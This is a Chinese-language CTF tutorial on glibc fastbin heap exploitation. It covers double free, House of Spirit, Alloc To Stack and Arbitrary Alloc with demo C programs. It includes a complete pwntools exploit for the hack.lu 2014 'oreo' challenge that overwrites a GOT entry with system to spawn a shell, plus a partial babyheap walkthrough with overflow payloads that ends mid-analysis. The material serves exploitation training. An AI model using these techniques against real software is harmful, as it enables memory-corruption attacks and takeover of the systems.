# Fastbin Attack
## 简介
- `fastbin attack`是一类漏洞的利用方法，是指所有基于`fastbin`机制的漏洞利用方法。这类利用的前提是：
  - 存在堆溢出、`use-after-free`等能控制`chunk`内容的漏洞
  - 漏洞发生于`fastbin`类型的`chunk`中

- 如果细分的话，可以做如下的分类：
  - `Fastbin Double Free`
  - `House Of Spirit`
  - `Alloc To Stack`
  - `Arbitrary Alloc`

- 其中，前两种主要漏洞侧重于利用`free`函数释放真的`chunk`或伪造的`chunk`，然后再次申请`chunk`进行攻击，后两种侧重于故意修改`fd`指针，直接利用`malloc`申请指定位置`chunk`进行攻击

## 原理
- `fastbin attack`存在的原因在于`fastbin`是使用单向链表来维护释放的堆块的，并且由`fastbin`管理的`chunk`即使被释放了，其`next_chunk`的`prev_inuse`位也不会被清空
  
- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	void *chunk1, *chunk2, *chunk3;
	chunk1 = malloc(0x30);
	chunk2 = malloc(0x30);
	chunk3 = malloc(0x30);
	
	free(chunk1);
	free(chunk2);
	free(chunk3);
	
	return 0;
}
```

- `free`前，`chunk`情况

![](images/1.png#pic_center)

- `free`后，`chunk`情况以及`fastbin`情况

![](images/2.png#pic_center)

- 可以看到，创建的`chunk`的大小为`0x30`，在释放后会进入`fastbin`，由于`fastbin`是以单向链表的形式管理释放的`chunk`，所以`chunk`只有`fd`位置具有指针，并且指向前一个`chunk`的`prev_size`
- 上图中有一个白色的`<-- 0x0`的标识，这表面`chunk1`前面已经没有被释放的`chunk`了，
- 需要注意的是，在`fastbin`中后一个被释放的`chunk`的`fd`指向前一个被释放的`chunk`的`prev_size`，`main_arena`指向最后一个被释放的`chunk`的`prev_size`
- 另外还有一点需要注意，释放阶段`chunk`的`prev_inuse`标志位为`1`，释放后，`chunk`的`prev_inuse`位依然还是`1`

## Fastbin Double Free
- `Fastbin Double Free`是指`fastbin`的`chunk`可以被多次释放，因此可以在`fastbin`链表中存在多次，这样导致的后果是多次分配可以从`fastbin`链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (`type confused`) 的效果
- `Fastbin Double Free`能够成功利用主要有两部分的原因：
  - `fastbin`的堆块被释放后`next_chunk`的`pre_inuse`位不会被清空
  - `fastbin`在执行`free`的时候仅验证了`main_arena`直接指向的块，即链表指针头部的块，对于链表后面的块，并没有进行验证

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x20);
    chunk2 = malloc(0x20);

    free(chunk1);
    free(chunk1);
	
    return 0;
}
```

- 执行上述代码编译的程序，由于程序释放两次`chunk1`，在执行过程中程序会检测到`SIGABRT`信号，紧接着进入核心转储，程序中断，这是因为`_int_free`函数检测到了`fastbin`的`double free`，这是因为`fastbin`在执行`free`的时候仅验证了`main_arena`直接指向的块，即链表指针头部的块，在释放`chunk1`后`main_arena`直接指向的就是`chunk1`，这个时候再去释放`chunk1`，便会产生`double free or corruption`报错

![](images/3.png#pic_center)

- 如果在`chunk1`释放后，再释放`chunk2`，此时`main_arena`指向的`chunk2`，因此再释放`chunk1`时便不会被检测到
- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x20);
    chunk2 = malloc(0x20);

    free(chunk1);
	  free(chunk2);
    free(chunk1);
	
    return 0;
}
```

- 可以看到，`chunk1`再一次被释放后，又重新被挂进`fastbin`链表中，最后白色的标识证明`chunk2`前面还是存在一个释放后被挂进`fastbin`中的堆块的
- 此时可以将`chunk1`看作一个新的块，也就意味着`chunk1`作为`chunk2`的后一个块被释放，那么此时`chunk1`的`fd`的值并不是`0`，而是指向`chunk2`，那么这个时候如果可以控制`chunk1`的内容，就可以修改`fd`指针，从而实现在任意地址分配`fastbin`块

![](images/4.png#pic_center)

![](images/5.png#pic_center)

## House Of Spirit
- `House of Spirit`是`the Malloc Maleficarum`中的一种技术，该技术的核心在于在目标位置处伪造`fastbin chunk`，并将其释放，从而达到分配指定地址的`chunk`的目的
- 要想构造`fastbin fake chunk`，并且将其释放时，可以将其放入到对应的`fastbin`链表中，需要绕过一些必要的检测：
  - `fake chunk`的`ISMMAP`位不能为`1`，因为`free`时，如果是`mmap`的`chunk`，会单独处理
  - `fake chunk`地址需要对齐，`MALLOC_ALIGN_MASK`
  - `fake chunk`的`size`大小需要满足对应的`fastbin`的需求，同时也得对齐
  - `fake chunk`的`next chunk`的大小不能小于`2 * SIZE_SZ`，同时也不能大于`av->system_mem`，即`128kb`

- `fake chunk`对应的`fastbin`链表头部不能是该`fake chunk`，即不能构成`double free`的情况

- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

- 示例代码中，先`malloc`创建了一个`0x1`大小的`chunk`，接着定义了一个`long long`类型的指针`a`和一个`long long`类型的数组`fake_chunks[10]`，后面的`__attribute__ ((aligned (16)))`，其中`__attribute__ ((aligned(ALIGNMENT)))`是用来指定变量或结构体最小字节对齐数，以`byte`为单位，`ALIGNMENT`为指定的字节对齐操作数
- 然后将数下标为`1`的位置放入数据`0x40`，数组下标为`9`的位置放入数据`0x1234`
- 接着打印数组下标为`1`位置的地址，将数组下标为`2`的地址赋值给指针`a`
- 接着打印数组下标为`1`和`2`位置的地址，然后重新申请一个大小为`0x30`的`chunk`

- 先查看一下`fake_chunk`数组的部署情况

![](images/6.png#pic_center)

![](images/7.png#pic_center)

- 接着将`0x40`、`0x1234`分别写进`fake_chunks[1]`和`fake_chunks[9]`的位置，并再次查看`fake_chunk`的部署情况

![](images/8.png#pic_center)

- 可以看到此时，`fake_chunks[1]`的位置被覆盖为`0x40`，`fake_chunk[9]`的位置变为了`0x1234`
- 改变这两个位置的目的是来伪造一个假的`chunk`，`0x7fffffffde40`位置作为`chunk`的`prev_size`，`0x7fffffffde48`位置的的`0x40`作为`chunk`的`size`位，`0x7fffffffde50`-`0x7fffffffde78`用作`fake_chunk`的`data`区域，`fake_chunks[9]`位置放置`0x1234`，作为`next_chunk`的`size`位

- 接下来完成了对指针`a`的赋值，会将`fake_chunk[2]`的地址赋给指针`a`，这里的`fake_chunk[2]`其实对应的就是伪造块的`data`指针，打印后看一下`a`指针的地址

![](images/9.png#pic_center)

- 接着`free`掉伪造的`chunk`，查看一下`bin`

![](images/10.png#pic_center)

- 此时，虽然`fake_chunk`并不是由`malloc`申请的，但是由于其符合释放时放入到对应的`fastbin`链表的条件，因此可以
在`free`后挂进`fastbin`链表中
- 接着再申请一个`0x30`的`chunk`，可以看到其地址为``，查看`fastbin`，可以看到`fake_chunk`经过这一次申请之后被重新启用

![](images/11.png#pic_center)

- 利用`House Of Spirit`这种技术，如果能在任意可写位置伪造`chunk`，并且事先部署好`free`函数的`got`地址，再通过泄漏的方式得到`system`函数和`/bin/sh`字符串地址，接着使用`House Of Spirit`将伪造`chunk`释放重启，接着将伪造`chunk`中的`free`函数的真实地址修改成`system`函数的地址，这样一来在释放某一个`chunk`的时候，不输入`chunk`的`id`，而是输入`/bin/sh`便可以`getshell`

## Alloc To Stack

- `Alloc To Stack`这种技巧和`Fastbin Double Free`与`House Of Spirit`技术差不多，这三种技巧的本质都在于`fastbin`链表的特性，当前`chunk`的`fd`指针指向下一个`chunk`
- `Alloc To Stack`这种技术关键点在于劫持`fastbin`链表中`chunk`的`fd`指针，把`fd`指针指向想要分配的栈上，从而实现控制栈中的一些关键数据，例如返回地址等

- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct _chunk
{
	long long pre_size;
	long long size;
	long long fd;
	long long bk;
} CHUNK, *PCHUNK;

int main()
{
	CHUNK stack_chunk;
	
	long long *chunk1;
	long long *chunk2;
	
	stack_chunk.size = 0x21;
	chunk1 = malloc(0x10);
	
	free(chunk1);
	
	*(long long *)chunk1 = &stack_chunk;
	malloc(0x10);
	chunk2 = malloc(0x10);
	
	return 0;
}
```

- 示例代码中，将`fake_chunk`置于栈中，同时劫持了`fastbin`链表中`chunk`的`fd`值，通过把`fd`值指向`stack_chunk`来实现在栈中分配`fastbin chunk`

- 先查看一下`free`之前的堆部署

![](images/12.png#pic_center)

- 接着查看一下`free`之后的堆部署以及`bin`中的情况

![](images/13.png#pic_center)

- 由于`chunk1`前面并没有任何`chunk`被释放，所以`chunk`的`fd`位置为空，不指向任何`chunk`
- 但是在释放`chunk1`之后并没有将其`malloc`指针置空，这就造成了`chunk1`可以被重新修改的状况，接下来将`chunk1`中`fd`的值修改为`stack_chunk`的结构体指针
- 在`fastbin`中可以看到，`stack_chunk`是在`chunk1`前面被释放的块，而`stack_chunk`其实是部署在栈上的一个伪造`chunk`

![](images/14.png#pic_center)

- 由此，堆管理器会认为在`fastbin`的`0x20`单向链表中存在两个`0x20`大小的被释放的堆块，此时如果连续申请两块`0x20`大小的堆块，栈上伪造的`stack_chunk`将会被作为一个`chunk`启用

![](images/15.png#pic_center)

![](images/16.png#pic_center)

- 通过`Alloc To Stack`技术，可以把`fastbin chunk`分配到栈中，从而控制返回地址等关键数据，要实现这一点需要劫持`fastbin`中`chunk`的`fd`域，把它指到栈上，当然同时需要栈上存在有满足条件的`size`值

## Arbitrary Alloc

- `Arbitrary Alloc`与`Alloc To Stack`基本上是完全相同的，唯一的区别是分配的目标不再是栈中，只要满足目标地址存在合法的`size`域（这个`size`域是构造的，还是自然存在的都无妨），就可以把`chunk`分配到任意的可写内存中，比如`bss`、`heap`、`data`、`stack`等等

- 示例代码

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	long long *chunk1;
	long long *chunk2;
	
	chunk1 = malloc(0x60);
	
	free(chunk1);
	
	*(long long *)chunk1 = 0x7ffff7dd1aed;
	malloc(0x10);
	chunk2 = malloc(0x60);
	
	return 0;
}
```

`0x7ffff7dd1b20`

- 示例代码中的`0x7ffff7dd1aed`即带有`malloc_hook`的`fake chunk`，查找方式如下
- 先查看一下当前`main_arena`的地址：`print (void*)&main_arena`

![](images/17.png#pic_center)

- 打印出`main_arena`地址为`0x7ffff7dd1b20`，而`malloc_hook`相对`main_arena`的偏移为`0x10`，这个是固定的，可以看到`malloc_hook`地址为`0x7ffff7dd1b10`

![](images/18.png#pic_center)

- 接下来使用命令`find_fake_fast 0x7ffff7dd1b10 0x70`来查找符合要求的`fake chunk`，可以看到符合要求的`fake chunk`的地址为`0x7ffff7dd1aed`

![](images/19.png#pic_center)

- 后续的操作步骤和`Alloc To Stack`一致，接下来的两次`malloc`，第一次会将`fastbin`中原有释放掉的`chunk1`重启，第二次`malloc`就会将带有`malloc_hook`的`fake_chunk`作为正常的`chunk`启用，并且将`malloc`指针赋给`chunk2`
- 因为`malloc_hook`地址存在于`chunk2`内容部分的地址，所以对`chunk2`进行恶意写操作的话，也会写到`malloc_hook`中，从而控制`hook`流程

## CTF例题
### 2014 hack.lu oreo
#### 静态分析

- 程序一共有`6`个功能
  - `Add new rifle`
  - `Show added rifles`
  - `Order selected rifles`
  - `Leave a Message with your Order`
  - `Show current stats`
  - `Exit`

![](images/20.png#pic_center)

- 在`addRifle`函数中，先将全局变量`dword_804A288`的值赋给`v1`，接着申请一个`0x38`大小的`chunk`，并且将该`chunk`的`malloc`指针存放在全局变量`dword_804A288`中
- 接着会判断`chunk`是否分配成功，成功的话会将变量`v1`中的值存放在`malloc指针+13`的位置，接着通过`fgets`函数接收枪支名字并存放在`malloc指针+25`的位置，且输入的字符最大为`56`个字节
- 接着会调用`sub_80485EC`函数，该函数主要起一个长度校验的作用
- 接着通过`fgets`函数接收强制描述并存放在`malloc指针`的起始位置，且输入的字符最大为`56`个字节
- 接着继续调用`sub_80485EC`函数后，全局变量`dword_804A2A4`自增

```c
unsigned int addRifle()
{
  char *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = dword_804A288;
  dword_804A288 = (char *)malloc(0x38u);
  if ( dword_804A288 )
  {
    *((_DWORD *)dword_804A288 + 13) = v1;
    printf("Rifle name: ");
    fgets(dword_804A288 + 25, 56, stdin);
    sub_80485EC(dword_804A288 + 25);
    printf("Rifle description: ");
    fgets(dword_804A288, 56, stdin);
    sub_80485EC(dword_804A288);
    ++dword_804A2A4;
  }
  else
  {
    puts("Something terrible happened!");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

```c
unsigned int __cdecl sub_80485EC(const char *a1)
{
  size_t v1; // edx
  const char *v3; // [esp+28h] [ebp-10h]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = strlen(a1) - 1;
  v3 = &a1[v1];
  if ( &a1[v1] >= a1 && *v3 == 10 )
    *v3 = 0;
  return __readgsdword(0x14u) ^ v4;
}
```

- 在`addRifle`函数中申请的`chunk`的结构图如下图所示，其中有几个点需要注意
  - 全局变量`dowrd_804A288`中存放的是申请的`malloc`指针，但是这个`malloc`指针并没有按照任何的结构进行摆放，而是每新申请一个`chunk`，它的上一个申请的`malloc`指针就会被覆盖为新的`malloc`指针，所以全局变量`dowrd_804A288`中只会存在一个`chunk`的`malloc`指针，即最后一次申请的`malloc`指针
  - 在`rifle_name`结尾追加的前一个`chunk`的`malloc`地址，其作用是为了将申请的多个`chunk`串联起来
  - 全局变量`dword_804A2A4`有计数功能，记录的是已申请的`chunk`的数量
  - 该函数中存在堆溢出，由于`fgets`函数最多可以接收`56`字节的输入，这就导致了输入的字符串会冲出成员变量的长度限制，从而导致数据溢出到其它成员变量位置或者其它`chunk`中

![](images/21.png#pic_center)

- 在`showRifle`函数中，通过循环来遍历`rifle_name`和`rifle_description`，从最后一个申请的`chunk`开始，每一次循环后进行`(char *)*((_DWORD *)i + 13)`操作，这里正好会指向结尾处前一个`chunk`的`malloc`指针

```c
unsigned int showRifle()
{
  char *i; // [esp+14h] [ebp-14h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = dword_804A288; i; i = (char *)*((_DWORD *)i + 13) )
  {
    printf("Name: %s\n", i + 25);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

- 在`orderRifle`函数中，先将全局变量`dword_804A288`的值赋给`v1`，接着通过全局变量`dword_804A2A4`来判断是否存在申请的`chunk`，存在的话接着将变量`v1`的值赋值给变量`ptr`，接着将`malloc point`的值赋值给变量`v1`，并释放掉变量`ptr`中的`malloc`指针
- 接着将全局变量`dword_804A288`中的`malloc`指针置空，将全局变量`dword_804A2A0`自加
- 进行循环，直到将所有已创建的`chunk`释放掉后，跳出循环
- 但是需要注意的是，变量`ptr`每一次释放后都会被变量`v1`重新赋值，在最后一次释放时，变量`ptr`并没有被置空

```c
unsigned int orderRifle()
{
  char *v1; // [esp+14h] [ebp-14h]
  char *ptr; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = dword_804A288;
  if ( dword_804A2A4 )
  {
    while ( v1 )
    {
      ptr = v1;
      v1 = (char *)*((_DWORD *)v1 + 13);
      free(ptr);
    }
    dword_804A288 = 0;
    ++dword_804A2A0;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

- 在`levelMessage`函数中，用来存储对订单的留言

```c
unsigned int leaveMessage()
{
  unsigned int v1; // [esp+1Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(dword_804A2A8, 128, stdin);
  sub_80485EC(dword_804A2A8);
  return __readgsdword(0x14u) ^ v1;
}
```

- 在`show`函数中，用来展示当前添加了多少只枪，订了多少单，留下了什么信息

```c
void __noreturn show()
{
  puts("======= Status =======");
  printf("New:    %u times\n", dword_804A2A4);
  printf("Orders: %u times\n", dword_804A2A0);
  if ( *dword_804A2A8 )
    printf("Order Message: %s\n", dword_804A2A8);
  puts("======================");
}
```

#### 动态分析
- 由于存在堆溢出，可以利用`rifle_name`溢出，将某个函数的`got`地址覆盖掉`mallo point`，那么在调用`showRifle`函数时便会将该函数的真实地址打印出来，接着通过`libcSearch`来寻找`sys_addr`和`bin_sh_addr`

![](images/22.png#pic_center)

- 在拿到`sys_addr`和`bin_sh_addr`后，伪造`chunk`来将某个函数的`got`中的的函数替换成`system`函数的地址，由于每创建一个`chunk`，全局变量`dword_804A2A4`的地址就会自增，因此可以用其当作`chunk`的`size`
- 如下图所示，`0x804A2A4`可以作为`fake_chunk`的`size`，`0x804A2A0`可以作为`fake_chunk`的`prev_size`，`0x804A2A8`可以作为`fake_chunk`的`data`的`malloc`地址，因此，通过申请`0x40`个`chunk`即可伪造一个`fake_chunk`，并且要保证申请的第`0x3f`个`chunk`结尾的`chunk_point`指针要指向`0x804A2A8`

![](images/23.png#pic_center)

- 伪造好`chunk`后，需要伪造`chunk`的后一个释放`chunk`对于伪造`chunk`的检查
  - 伪造`chunk`的`size`大小为`0x40`，所以从`0x804A2A8`到`0x804A2D8`共`0x30`的空间都应该归属于伪造`chunk`，因此`fake_chunk`的后一个`chunk`的`prev_size`地址就应该为`0x804a2e0`
  - 如果想在释放`fake_chunk`之后立刻就可以申请重新启用，那么后一个`chunk`的大小就应该大于`fastbin`的最大范围`0x40`（`32`位程序），这样在释放后`fake_chunk`就可以直接挂在`fastbin`中`main_arena`之前，那么这里可以将后一个`chunk`的`size`设置为`0x100`
  - 由于后一个`chunk`的`size`大小超过的`fastbin`的最大值，那么后一个`chunk`的`prev_size`就需要标识前一个释放块`fake_chunk`的`size`，并且`prev_inuse`位要标志位`0`，即`0x40`

![](images/24.png#pic_center)

- 由于伪造的`fake_chunk`的`malloc`地址位置恰好是留言的指针，在留言功能中，输入的字符串会存放全局变量`dword_804A2A8`所指向的地址当中，全局变量`dword_804A2A8`的地址为`0x804A2A8`，且留言指针指向`0x804a2c0`，也就是说输入的字符串是从`0x804a2c0`开始存放的
- 那么这样以来，去除`0x804A2A8`到`0x804A2B8`中的`24`个字节，还需要空出`0x20`个字节的空间留给`fake_chunk`
- 部署好`chunk`后，调用提交订单功能来释放伪造的`fake_chunk`

#### EXP

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h3rmesk1t/oreo')
elf = ELF('/home/h3rmesk1t/oreo')
libc = ELF('/home/h3rmesk1t/libc.so.6')

def add_rifle(name, description):
    r.sendline(b'1')
    r.sendline(name)
    r.sendline(description)

def show_rifle():
    r.sendline(b'2')
    r.recvuntil(b'===================================\n')

def order_rifle():
    r.sendline(b'3')

def level_message(message):
    r.sendline(b'4')
    r.sendline(message)


name = b'a' * 27 + p32(elf.got['puts'])
description = b'b' * 25
add_rifle(name, description)
show_rifle()

r.recvuntil(b'Description: ')
r.recvuntil(b'Description: ')

puts_addr = u32(r.recvuntil('\n', drop=True)[:4])
log.success('puts address: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

num = 1
while num < 0x3f:
    add_rifle(b'a' * 27 + p32(0), b'b' * 25)
    num += 1
payload = b'a' * 27 + p32(0x804A2A8)
add_rifle(payload, b'b' * 25)

payload = b'\x00' * 0x20 + p32(40) + p32(0x100)
payload = payload.ljust(52, b'a')
payload += p32(0)
payload = payload.ljust(128, b'a')
level_message(payload)
order_rifle()

payload = p32(elf.got['strlen']).ljust(20, b'a')
add_rifle(b'a' * 20, payload)
# gdb.attach(r)
log.success('system addr: ' + hex(sys_addr))
# gdb.attach(r)
level_message(p32(sys_addr) + b';/bin/sh\x00')

r.interactive()
```

### 2017 0ctf babyheap
#### 静态分析

- 程序是一个堆分配器，包含以下五个功能：
  - `Allocate`
  - `Fill`
  - `Free`
  - `Dump`
  - `Exit`

- 分析程序后发现漏洞点在于`Fill`功能中，用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾，而且这个指定长度是指定的，并不是之前`chunk`分配时指定的长度，所以这里就出现了任意堆溢出的情形

```c
__int64 __fastcall fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (unsigned int)result <= 0xF )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

#### 动态分析
- 可以确定的是，主要有的漏洞就是任意长度堆溢出，并且由于该程序几乎所有保护都开启了，所以必须要有一些泄漏才可以控制程序的流程
- 这里选用`main_arena`地址作为关键地址，其它地址都通过`main_arena`作为基地址来偏移获取
- 通过情况下，想要得到`main_arena`地址，会考虑从`unsorted bin`下手，因为不与`top_chunk`相邻的第一个被释放进`unsorted bin`的`chunk`，该`chunk`的`fd`位置会指向`unsorted bin address`，而`unsorted bin address`与`main_arena`之间的偏移是固定的
- 因此，当构建好`unsorted bin chunk`后，只需要利用程序中的`dump`函数打印`unsorted bin chunk`就可以泄露出`unsorted bin address`

- 首先创建`4`个`0x20`大小的`chunk`，再创建一个`0x90`大小的`chunk`，这样设置的目的是通过释放`chunk3`和`chunk2`进入`fastbin`当中，这样一来`fastbin`当中的情况就会变为`chunk2_fd` --> `chunk3_fd` --> `NULL`
- 在`fastbin`中部署好后就可以通过`fill`函数溢出`chunk1`，覆盖`chunk2_fd`的地址，使其指向`chunk5`，因为`chunk5`的`size`为`0x90`，所以在释放`chunk5`后其`fd`指针将会指向`unsorted bin addr`，这样一来`chunk5`就会因为`chunk2_fd`被溢出而拉下水

- `mmap`创建的内存区域的起始地址是近乎随机产生的，这里先要查看结构体的位置，通过`vmmap`来获取

![](images/25.png#pic_center)

![](images/26.png#pic_center)

- 按照之前的思路，先释放`chunk3`，再释放`chunk2`

![](images/27.png#pic_center)

- 接着通过`chunk1`溢出来覆盖`chunk2_fd`，覆盖后，`fastbin`中`chunk2` --> `chunk5`

```python
payload_chunk1_overflow = b'a' * 0x10 + p64(0) + p64(0x21) + p64(0x80)
```

![](images/28.png#pic_center)

- 接着如果想要对`chunk5`进行操作的话，就需要重启`fastbin`中`chunk2`指向的`chunk5`，但是由于`chunk5`的`size`是`0x90`而不是`0x20`，所以即使`chunk5`的`chunk`指针在`fastbin`的`0x20`单项链表中，但是也是无法启用的
- 所以还需要通过向`chunk4`中写溢出数据，使其覆盖`chunk5`的`size`为`0x20`，才能够重新启用`chunk5`

```python
payload_chunk4_overflow = b'a' * 0x10 + p64(0) + p64(0x21)
```

![](images/29.png#pic_center)

- 接着只需要重新申请两个`0x20`大小的`chunk`，第一次申请`0x20`会重新启用`fastbin`中`0x20`单项链表尾部的`chunk2`，第二次申请`0x20`就会启用`fastbin`中`0x20`单向链表剩下的`chunk5`



- 接着对`id`为`2`的`chunk5`进行操作，就等同与对`id`为`4`的`chunk5`进行操作
- 一开始之所以将`chunk5`的`size`定义为`0x90`，是为了接下来释放`chunk5`的时候进`unsortbin`能让`chunk5`的`fd`指向`unsortbin_addr`，所以接下来还需要对`chunk4`进行溢出，将`chunk5`的`size`改回`0x90`
- 接着再申请一个`0x90`大小的`chunk`后释放`chunk5`
- 由于前面已经在`id`为`2`的结构体处部署了`chunk5`的`chunk`指针，所以接下来只需要调用程序中的`dump`函数打印`id`为`2`的`chunk`内容，就可以把`chunk5`中的`unsorted bin addr`（`fd`）打印出来了




